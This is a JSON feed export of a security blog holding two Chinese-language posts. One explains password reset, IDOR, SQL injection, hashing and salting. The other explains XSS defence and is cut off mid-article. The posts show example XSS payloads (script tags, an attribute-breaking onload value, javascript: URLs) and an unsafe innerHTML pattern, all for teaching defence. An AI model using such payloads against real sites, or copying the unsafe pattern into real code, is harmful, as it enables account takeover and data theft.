{
  "version": "https://jsonfeed.org/version/1",
  "title": "Cymetrics Tech Blog",
  "home_page_url": "https://tech-blog.cymetrics.io",
  "feed_url": "https://tech-blog.cymetrics.io/feed/feed.json",
  "description": "Cymetrics Tech Blog",
  "author": {
    "name": "Cymetrics Tech Blog",
    "url": ""
  },
  "items": [{
      "id": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "title": "為什麼忘記密碼時只能重設，不把舊密碼告訴我？",
      "content_html": "<p>某天小明在整理他的我的最愛（到底誰的），發現了一個以前很常逛，但已經將近半年多沒去的一個論壇。小明想回去看看那邊變得怎麼樣了，於是點進去那個論壇，輸入了帳號密碼，得到了密碼錯誤的回覆。</p>\n<p>嘗試了幾次之後，系統提示小明可以使用「忘記密碼」的功能，所以小明填了自己的 email 之後去信箱收信，發現系統傳來一個「重設密碼」的連結。雖然說最後小明成功利用重新設定的密碼登入，但有個問題讓他百思不得其解：</p>\n<blockquote>\n<p>「奇怪欸，幹嘛要我重設密碼，為什麼不把舊的密碼寄給我就好？」</p>\n</blockquote>\n<!-- summary -->\n<p>應該有許多人都跟小明一樣，有過類似的疑惑。把舊密碼寄給我不是很好嗎，幹嘛強迫我換密碼？</p>\n<p>這一個看似簡單的問題，背後其實藏了許多資訊安全相關的概念，就讓我們慢慢尋找問題的答案，順便學習一些基本的資安知識吧！</p>\n<!-- summary -->\n<p>先提醒一下，雖然說前半段看起來可能跟文章主題無關，但好酒沉甕底，我保證最後會把這些東西關聯起來。</p>\n<h2 id=\"%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\"><a class=\"direct-link\" href=\"#%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\">#</a> 被偷走的資料庫</h2>\n<p>大家應該很常看到新聞說哪個網站的資料又被偷走了，顧客個資全部都外洩出去。例如說<a href=\"https://tw.news.yahoo.com/%E5%80%8B%E8%B3%87%E9%81%AD%E6%B4%A9-%E9%BA%A5%E7%95%B6%E5%8B%9E%E8%81%B2%E6%98%8E-%E4%B8%8D%E5%90%AB%E4%BB%98%E6%AC%BE%E8%B3%87%E6%96%99-103012207.html\">麥當勞</a>在近期就發生了類似的事件：</p>\n<p><img src=\"/img/posts/huli/reset-password/p1.png\" alt=\"麥當勞資料外洩的通知信\"></p>\n<p>這邊我想帶大家探討的兩個問題是：</p>\n<ol>\n<li>資料真的這麼容易外洩嗎？</li>\n<li>資料外洩之後，可能造成什麼後果？</li>\n</ol>\n<p>我們先來看第一個問題，有很多安全性的漏洞可以造成資料外洩，而有些漏洞的攻擊方式，比你想的還簡單一百倍。</p>\n<p><img src=\"/img/posts/huli/reset-password/p2.jpeg\" alt=\"Photo by Arget on Unsplash\"></p>\n<p>你想像中的駭客可能像上面那樣，打著一大堆不知道在幹嘛的指令，畫面上出現很多黑底白字或是綠字的畫面，完全搞不懂在幹嘛，但是做著做著網站就被打下來了。</p>\n<p>而事實上有些漏洞，可能在網址列上面改幾個字就攻擊成功了，就算你不懂任何程式也做得到。</p>\n<p>舉例來說好了，假設今天有個購物網站，你買了一些東西之後送出訂單，訂單成立後跳轉到訂單頁面，上面有著一大堆你的個資，例如說：姓名、收貨地址、聯絡電話以及 Email 等等。</p>\n<p>然後你發現訂單頁面的網址是 <a href=\"https://shop.huli.tw/orders?id=14597\">https://shop.huli.tw/orders?id=14597</a></p>\n<p>而正好你的訂單編號也是 14597，在好奇心的驅使之下，你就試著把數字改成 14596，然後按下 Enter。</p>\n<p>當網站載入完成之後，你竟然還真的能看到編號為 14596 的訂單，上面出現一個你不認識的人的姓名、收貨地址、聯絡電話跟 Email。</p>\n<p>有些攻擊就是這麼樸實無華且枯燥，只要改個字就能看到屬於其他人的資料。這時候如果你會寫程式的話，就可以寫個腳本自動去抓 id 是 1 一直到 id 是 15000 的資料，你就拿到了這個購物網站 15000 筆訂單的資訊，也就是一萬多個顧客的個資。</p>\n<p>這過程中沒有什麼黑底白字的畫面，也不用一直瘋狂打字，唯一需要的只有改數字，個資就輕鬆到手。</p>\n<p>這類型的漏洞有個專有名詞，稱為 IDOR，全名是：Insecure direct object references，大約就是不安全的直接資料存取的意思。漏洞產生的原因就是工程師在開發時，並沒有注意到權限控管，因此讓使用者能存取到其他人的資料。</p>\n<p>有些人看到這邊可能以為我只是為了文章淺顯易懂，所以才舉一個簡化的例子，現實生活中的攻擊才沒這麼簡單。</p>\n<p>這句話算是對了一半，大部分的網站確實都不會有這麼明顯的一個漏洞，攻擊方式會更複雜一點。但可怕的是，還真的有些網站就是這麼簡單，就是改個數字就可以拿到別人的資料。</p>\n<p>台灣有一個網站叫做 <a href=\"https://zeroday.hitcon.org/\">HITCON ZeroDay</a>，是由台灣駭客協會所維護的漏洞回報平台。有些人發現漏洞之後可能會竊取個資拿去賣，從事非法行為，也有些人發現漏洞只是為了鍛鍊技術，並沒有想要做什麼壞事。</p>\n<p>因此就可以透過這個平台進行回報，回報漏洞之後負責維護平台的志工們會幫你驗證漏洞，驗證過後回報給負責的廠商，讓他們去修復漏洞。</p>\n<p>這個平台上的漏洞在修復過後隔一陣子會公開，或者儘管廠商沒有回報修復，過一陣子（例如說兩個月）後也會公開，因此在這平台上可以找到許多公開的漏洞，看過之後你大概就不會想在網站註冊時留下真實個資了…</p>\n<p>例如說這兩個就是 IDOR 的真實漏洞：</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00206\">享健身xarefit 任意訪問/下載所有會員個資</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00260\">DoorGods 防疫門神實聯制系統IDOR導致個資外洩</a></li>\n</ol>\n<p>對，不要懷疑，就真的只是在網址上改個數字而已這麼容易。</p>\n<p>以後只要看到網址列上有這種數字，就可以試著去改改看，搞不好不會寫程式的你也可以發現 IDOR 的漏洞。</p>\n<p>除了這種只要改個東西的漏洞之外，還有另外一個很常見但是需要一點技術能力才能攻破的漏洞，叫做 SQL Injection。</p>\n<p>先來講講 SQL 是什麼，簡單來說就是跟資料庫查詢東西的一種程式語言。既然說是語言那就會有固定語法，若是以中文舉例，大概就像是：</p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 1 的」，按照「建立時間」排序</p>\n</blockquote>\n<p>用「」框起來的部分代表可以變動，而其他關鍵字例如說「去找」、「給我」這些都是固定的，因為語法要固定才能寫程式去解析。</p>\n<p>同樣以上面假想的購物網站為例，如果網址是 <a href=\"https://shop.huli.tw/orders?id=14597%EF%BC%8C%E9%82%A3%E7%B6%B2%E7%AB%99%E5%8E%BB%E8%B7%9F%E8%B3%87%E6%96%99%E5%BA%AB%E6%8B%BF%E8%B3%87%E6%96%99%E6%99%82%EF%BC%8C%E6%8C%87%E4%BB%A4%E5%A4%A7%E6%A6%82%E5%B0%B1%E6%98%AF%EF%BC%9A\">https://shop.huli.tw/orders?id=14597，那網站去跟資料庫拿資料時，指令大概就是：</a></p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 14597 的」</p>\n</blockquote>\n<p>因為網址列上的 id 是 14597 嘛，所以這個 id 就會被放到查詢的指令去，如果 id 是別的，那查詢的指令也會不一樣。</p>\n<p>這時候如果我的 id 不是數字，而是「1 的順便給我使用者資料」，查詢就變成：</p>\n<blockquote>\n<p>去找「訂單資料」，給我「id 是 1 的順便給我使用者資料」</p>\n</blockquote>\n<p>那整個網站的使用者資料就順便被我抓下來了。</p>\n<p>這個攻擊之所以叫做 SQL injection，重點就在於那個 injection，攻擊者「注入」了一段文字被當作指令的一部分執行，所以攻擊者就可以執行任意查詢。</p>\n<p>比起上面講的 IDOR，SQL injection 通常會更為致命，因為不只是訂單資料本身，連其他資料也會被一起撈出來。所以除了訂單資料，會員資料跟商品資料都有可能一起外洩。</p>\n<p>這邊也隨便找兩個公開的案例：</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2020-00276\">北一女中網站存在SQL Injection漏洞</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00052\">桃園高中 網站 SQL injection</a></li>\n</ol>\n<p>而防禦方式就是不要把使用者輸入的「1 的順便給我使用者資料」直接當作指令，而是經過一些處理，讓整段查詢變成：「給我 id 是：『1 的順便給我使用者資料』的資料」，那因為沒有這個 id，所以什麼事也不會發生。</p>\n<h2 id=\"%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F\">#</a> 個資洩漏了，然後呢？</h2>\n<p>前面我們已經看到了針對那些沒有做好防禦的網站，個資外洩是多麽容易的一件事情。</p>\n<p>那個資洩漏之後，對使用者會有什麼影響呢？</p>\n<p>大家最感同身受的應該就是詐騙電話吧，例如說某些買書的網站或是訂房網站，打過來跟你說什麼要分期退款，為了博取你的信任，連你買了哪本書，訂了哪個房間，或是你家地址跟姓名全都講得出來。</p>\n<p>這些都是因為資料外洩的緣故，詐騙集團才會知道的這麼清楚。</p>\n<p>但除了這些個資以外，還有兩個東西也會外洩，那就是你的帳號跟密碼。</p>\n<p>也許你會想說：「不就帳號跟密碼嗎，我就在那個網站上面改密碼以後再用就好啦！」</p>\n<p>事情也許沒有你想的這麼簡單。如果你沒有用密碼管理軟體的話，我大膽猜測你所有的密碼可能都是同一組。因為怕記不起來嘛，所以乾脆都用同一組密碼。</p>\n<p>這時候如果帳密外洩，駭客是不是就可以拿這組帳密去其他服務試試看？</p>\n<p>拿去登你的 Google，登你的 Facebook，這時候用同一組密碼的人就會被登進去。所以從表面看只是一個購物網站被入侵，但造成的結果卻是你的 Google 還有 Facebook 也一起被盜了。</p>\n<p>所以，有時候某個網站被盜帳號可能不是那個網站的問題，而是駭客在其他地方拿到了你的帳號密碼，就來這邊試試看，沒想到就中了。</p>\n<p>對於網站的開發者而言，保護好使用者的個資是天經地義的事情，保護密碼也是，有沒有什麼好方法可以保護密碼呢？</p>\n<p>加密嗎？把密碼用某些演算法加密，這樣資料庫儲存的就會是加密後的結果，儘管被偷走了，駭客只要沒有解密的方法就解不開。</p>\n<p>聽起來似乎是最安全的做法了，但其實還有一個問題，那就是網站的開發者還是會知道怎麼解密，如果有工程師監守自盜怎麼辦？他還是可以知道每個使用者的密碼是什麼，可以把這些資訊拿去賣或者是自己利用。</p>\n<p>嗯…似乎我們也不能怎麼樣，因為無論如何，開發者都需要有方法知道資料庫存的密碼究竟是多少吧？不然在登入的時候怎麼確認帳號密碼是對的？</p>\n<p>再者，這樣聽起來應該夠安全了，要怎麼樣才能更安全？難道要連網站的開發者都無法解密，都不知道密碼是什麼才夠安全嗎？</p>\n<p>Bingo！答對了，就是要這樣沒錯！</p>\n<h2 id=\"%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\"><a class=\"direct-link\" href=\"#%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB\">#</a> 沒有人知道你的密碼，包括網站本身</h2>\n<p>事實上，網站的資料庫是不會儲存你的密碼的。</p>\n<p>或更精確地說，不會儲存你的「原始密碼」，但會儲存密碼經過某種運算後的結果，而且最重要的是，這個運算是無法還原的。</p>\n<p>直接舉例比較快，假設今天有個很簡單的演算法，可以把密碼做轉換，轉換方式是：「數字不做轉換，英文字母把 a 換成 1，b 換成 2…z 換成 26」，以此類推，第幾個字母就換成幾，大小寫不分都一樣（先假設不會有符號）。</p>\n<p>如果密碼是 abc123，轉換完就變成 123123。</p>\n<p>在使用者註冊的時候，網站就把使用者輸入的 abc123 轉成 123123，然後存到資料庫裡面。因此資料庫存的密碼是 123123，而不是 abc123。</p>\n<p>當使用者登入時，我們就再把輸入的值用同樣的邏輯轉換，如果輸入一樣，轉換後的結果就會一樣對吧？就知道密碼是不是正確的。</p>\n<p>當駭客把資料庫偷走以後，會拿到 123123 這組密碼，那一樣啊，不是可以推論出原本是 abc123 嗎？不不不，沒這麼簡單。</p>\n<p>123123、abcabc、12cab3…這些密碼轉換之後，不也是 123123 嗎？所以儘管知道轉換規則跟結果，卻沒有辦法還原成「唯一一組密碼」，這就是這個演算法厲害的地方！</p>\n<p>這樣的轉換就叫做雜湊（Hash），abc123 每次 hash 過後的結果都會是 123123，但是從 123123 卻無法推回輸入一定是 abc123，因為有其他種可能性存在。</p>\n<p>這就是 hash 跟加密最大的不同。</p>\n<p>加密跟解密是成對的，如果可以加密就一定可以解密，所以你知道密文跟密鑰，就可以知道明文。但 hash 不同，你知道 hash 的演算法跟結果，卻無法回推出原本的輸入是什麼。</p>\n<p>而這個機制最常見的應用之一，就在於密碼的儲存。</p>\n<p>在註冊時把 hash 過後的密碼存進資料庫，登入時把輸入的密碼 hash 過後跟資料庫比對，就知道密碼是否正確。就算資料庫被偷，駭客也不知道使用者的密碼是什麼，因為回推不出來。</p>\n<p>這就是為什麼忘記密碼的時候，網站不會跟你講原本的密碼是什麼，因為網站本身也不知道啊！</p>\n<p>所以不能「找回密碼」，只能「重設密碼」，因為重設就代表你輸入新的密碼，然後網站把新的密碼 hash 之後存進資料庫，未來登入時就會用這組新的 hash 去比對。</p>\n<p>有些人可能會注意到這樣的儲存方式似乎有個漏洞，延續前面的例子，資料庫存的是 123123 而我的原始密碼是 abc123，這樣如果用「abcabc」，hash 過後也是 123123，不就也可以登入嗎？這樣不太對吧，這不是我的密碼欸</p>\n<p>有兩個不同的輸入卻產生出同一組輸出，這種狀況稱為碰撞（hash collision），碰撞一定會發生，但如果演算法設計的好，碰撞的機率就超級無敵小，小到幾乎可以忽略。</p>\n<p>前面提的轉換規則只是為了方便舉例，真實世界中用的演算法複雜許多，就算只有一個字不同，結果都會天差地遠，以 SHA256 這個演算法為例：</p>\n<ol>\n<li>abc123 =&gt; 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090</li>\n<li>abc124 =&gt; cd7011e7a6b27d44ce22a71a4cdfc2c47d5c67e335319ed7f6ae72cc03d7d63f</li>\n</ol>\n<p>類似的輸入卻產生截然不同的輸出。</p>\n<p>像我前面舉例用的轉換就是不安全的 hash 演算法，要盡量避免使用或是避免自己設計，盡可能使用密碼學家跟專家設計出的演算法，像是上面提到的 SHA256。</p>\n<p>在使用這些演算法的時候，也要特別注意一下是否安全，因為有些演算法雖然也是由專家設計，但已經被證明是不安全的，例如說密碼用 MD5 來 hash 後儲存就是不安全的，可以參考：<a href=\"https://security.stackexchange.com/questions/19906/is-md5-considered-insecure\">Is MD5 considered insecure?</a></p>\n<h2 id=\"%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F\">#</a> 所以，儲存 hash 後的值就沒事了嗎？</h2>\n<p>抱歉，其實只儲存密碼 hash 過後的值是不夠的。</p>\n<p>咦，為什麼？我剛剛不是說沒辦法反推出結果嗎，那為什麼不夠？</p>\n<p>雖然說沒辦法反推出結果，但攻擊者可以利用「輸入一樣，輸出一定一樣」的特性，先建好一個資料庫。</p>\n<p>舉例來說，假設有個很常見的密碼 abc123，hash 過後的值是 6ca13d，那攻擊者就可以先算好，然後把這個關係存在資料庫，所以攻擊者的資料庫裡面就可能會有一百萬組最常見密碼的清單，裡面有著每個密碼跟它 hash 過後的值。</p>\n<p>那接下來只要在 hash 過後的資料庫發現 6ca13d，攻擊者就可以透過查表的方式，查出原本的密碼是 abc123。這不是利用演算法反推結果，這只是利用現有資料來查詢而已。</p>\n<p>為了防禦這種攻擊，還要做一件事情叫做加鹽（Salting），沒錯，就是鹽巴的那個鹽。通常會幫每個使用者產生一個獨一無二的鹽巴，例如說 5ab3od（實際上會更長，可能 16 或 32 個字以上），接著把我的密碼 abc123 加上我的鹽巴，變成 abc1235ab3od，然後用這個加鹽過後的結果去做 hash。</p>\n<p>為什麼要這樣做呢？</p>\n<p>因為攻擊者預先準備好的表格中，比起 abc123，出現 abc1235ab3od 的機率顯然更低，同時又因為長度變長了，暴力破解的難度變得更高。如此一來，密碼就變得更難破解了。</p>\n<p>更多資訊請參考：<a href=\"https://www.ithome.com.tw/voice/127918\">不是祕密的祕密</a></p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>忘記密碼時網站不會把密碼寄給我，因為網站自己都不知道我的密碼是什麼。雖然聽起來不太可能，但實際狀況就是如此。為了安全性，這是必須的手段。</p>\n<p>要達成這樣的目的，背後最重要的技術原理就是 hash，「同樣的密碼會產生同樣的 hash 值，但從 hash 值沒辦法對應回原本的密碼」就是秘訣所在。</p>\n<p>反之，如果你發現有網站可以找回你的密碼，那就得要多加注意，有可能網站資料庫存的不是 hash 值而是你的密碼。在這種狀況下，萬一有天資料庫被入侵，帳密被偷走，駭客就能得知你真實的密碼，然後去試其他的服務。</p>\n<p>有關於密碼管理，現在瀏覽器也有功能可以自動幫你產生密碼外加記憶密碼，或也可以使用現成的密碼管理軟體，都可以在不同網站產生不同的密碼。</p>\n<p>這篇希望能讓對這個領域陌生的讀者們也能知道一些基本的概念，包括：</p>\n<ol>\n<li>有些網站比你想得脆弱很多，改個網址就可以拿到別人的資料</li>\n<li>對於安全性做得不好的網站，拿到整個資料庫不是一件難事</li>\n<li>忘記密碼只能重設，不能找回，是因為網站也不知道你的密碼</li>\n<li>如果有網站可以把舊密碼給你，那你得要小心一點</li>\n</ol>\n",
      "date_published": "2021-07-09T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "title": "淺談 XSS 攻擊與防禦的各個環節",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。</p>\n<!-- summary -->\n<p>而我所謂的這些「環節」，也可以理解成不同的「關卡」。</p>\n<p>舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。</p>\n<p>而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」</p>\n<p>這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。</p>\n<p>假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 <code>&lt;img src=x onerror=alert(1)&gt;</code> 就會變得無效。</p>\n<p>若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。</p>\n<p>這時候還可以防守什麼呢？那就是試圖把損害控制到最低。</p>\n<p>以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。</p>\n<p>而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。</p>\n<p>接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 第一關：阻止攻擊者在網站植入程式碼</h2>\n<p>要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：</p>\n<blockquote>\n<p>永遠不要相信使用者的輸入</p>\n</blockquote>\n<p>只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。</p>\n<p>舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。</p>\n<p>如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。</p>\n<p>這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。</p>\n<p>要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 <code>&lt;</code> 轉成 <code>&amp;lt</code>，這樣在畫面上看到的依然是 <code>&lt;</code>，但是對 parser 來說那並不是標籤開始的符號，而是文字的 <code>&lt;</code>，就不會被當作 HTML 標籤來解析。</p>\n<p>如此一來，就能防止攻擊者植入程式碼。</p>\n<p>不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：</p>\n<ol>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html\">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html\">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)</a></li>\n</ol>\n<p>假設你只有想到說要對標籤做跳脫，把 <code>&lt;&gt;</code> 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= avatar_url ?><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= nickname ?><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token prolog\">&lt;?= nickname ?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 <code>&lt;&gt;</code> 是不夠的，因為如果我讓 nickname 變成 <code>&quot; onload=&quot;alert(1)</code> 的話，結合起來就會變成：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>avatar_url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\" onload=\"alert(1)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>攻擊者可以利用 <code>&quot;</code> 關閉前面的屬性，然後創出一個新的屬性 <code>onload</code>，達成 HTML 標籤屬性利用的 XSS。</p>\n<p>所以常見的特殊符號像是 <code>&quot;'&lt;&gt;</code> 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629700-8743df00-d0f1-11eb-937b-910934140e96.png\" alt=\"xss1\"></p>\n<p>那這樣就打完收工了嗎？還沒。</p>\n<p>因為，在連結裡的內容又是另外一回事了，例如說：<code>&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt;</code></p>\n<p>有一種東西叫做 JavaScript pseudo-protocol，可以利用 <code>javascript:</code> 來執行 JS 程式碼，像是這樣：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;</code>，在使用者點擊這個連結時，就會跳出 alert。</p>\n<p>而 <code>javascript:alert(1)</code> 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 <code>&quot;'&lt;&gt;&amp;</code>，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 <code>http://</code> 或是 <code>http://</code> 之類的。</p>\n<p>這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。</p>\n<p>有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」</p>\n<p>這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 <code>javascript:alert(1)</code> 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。</p>\n<p>React 在 v16.9 的時候就針對這個 case 新增了警告：<a href=\"https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls\">Deprecating javascript: URLs</a>，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。</p>\n<p>這邊有一些相關的討論：<a href=\"https://github.com/facebook/react/issues/16592\">React@16.9 block javascript:void(0); #16592</a> 與 <a href=\"https://github.com/facebook/react/issues/16382\">False-positive security precaution warning (javascript: URLs) #16382</a>，想看程式碼的話在這邊：<a href=\"https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js\">react/packages/react-dom/src/shared/sanitizeURL.js </a>。</p>\n<p>除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。</p>\n<p>因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。</p>\n<p>舉例來說，搜尋頁面的網址可能長這樣：<code>https://example.com/search?q=hello</code>，而在程式中是這樣寫的：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> q <span class=\"token operator\">=</span> <span class=\"token string\">'hello'</span> <span class=\"token comment\">// 從網址列拿下來的參數</span><br>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.search'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> q</code></pre>\n<p>這時如果你把 q 換成 HTML：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。</p>\n<p>最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> 或是 <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a> 